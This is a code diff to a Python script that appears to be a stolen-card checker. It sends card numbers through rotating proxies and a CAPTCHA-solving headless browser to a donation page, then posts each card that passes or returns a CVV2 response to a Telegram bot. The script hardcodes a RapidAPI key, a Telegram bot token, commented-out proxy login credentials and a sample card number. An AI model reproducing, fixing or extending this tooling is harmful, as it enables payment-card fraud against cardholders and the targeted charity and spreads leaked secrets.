@@ -35,18 +35,20 @@ def getUrl():
     random_line_num = random.randint(0, len(lines) - 1)
     site = lines[random_line_num].strip()
     return site
-
+   
 def get_enumproxy():
+    
     url = "https://ephemeral-proxies.p.rapidapi.com/v2/datacenter/proxy"
 
     headers = {
         "X-RapidAPI-Key": "60f7bdf787msh61ddbd43812c12cp1059a4jsnd4564938be2c",
-        "X-RapidAPI-Host": "ephemeral-proxies.p.rapidapi.com"}
+        "X-RapidAPI-Host": "ephemeral-proxies.p.rapidapi.com"
+    }
+
     response = requests.request("GET", url, headers=headers).json()
-    host = response["proxy"]["host"]
-    port = response["proxy"]["port"]
+    host = response['proxy']['host']
+    port = response['proxy']['port']
     return f"{host}:{port}"
-    
 async def solve(url):
     user_data_dir = "~/tmp/user-data-dir"
     firefo_ext = f"{cdir}/firefox-extension/buster_captcha_solver-2.0.1.xpi"
@@ -63,7 +65,7 @@ async def solve(url):
         # username = "geonode_JFNTdE7PxE"
         # password = "1c348b0d-606e-4a50-a71e-442329fc9212"
         # GEONODE_DNS = f"premium-residential.geonode.com:{port}"
-
+        
         async with async_playwright() as playwright:
             tries = tries + 1
             if tries > 5:
@@ -88,8 +90,9 @@ async def solve(url):
                 "--slow_mo=50",
             ]
             # proxy = {"server": GEONODE_DNS, "username": username, "password": password}
-            proxy = {"server": "http://"+get_enumproxy()}
+            
             try:
+                proxy = {"server": get_enumproxy()}
                 context = await playwright.firefox.launch_persistent_context(
                     headless=True,
                     proxy=proxy,
@@ -133,7 +136,7 @@ def process_check(cc):
     reqver = None
     insta = None
     gResponse = None
-    client = httpx.Client()
+    client = requests.session()
 
     def req_one():
         headersList = {
@@ -210,8 +213,11 @@ def process_check(cc):
                 data=payload,
                 headers=headersList,
             ).text
-            if '"success":true' in data or 'CVV2' in data:
-                requests.get('https://api.telegram.org/bot1405110178:AAFo20MsFbsCxH5tjWoPFKHsOVRgbdUwJWU/sendMessage?chat_id=1087333523&text='+cc)
+            if '"success":true' in data or "CVV2/VAK Failure" in data or "CVV2 Mismatch" in data:
+                requests.get('https://api.telegram.org/bot1405110178:AAFo20MsFbsCxH5tjWoPFKHsOVRgbdUwJWU/sendMessage?chat_id=1087333523&text=' + cc)
+        
+            # respo = await get_response(navigate)
+
             print(data)
             return data
 
@@ -220,7 +226,7 @@ def process_check(cc):
 
 # if __name__ == "__main__":
 
-#     cc="4112017306414955|03|2026|517"
+#     reqUrl="https://ops1.operations.daxko.com/online/2153/OnlineGiving/Donation.mvc"
 #     # reqUrl="https://ipinfo.io/ip"
-#     check = process_check(cc)
+#     check = process_check(reqUrl=reqUrl)
 #     print(check)
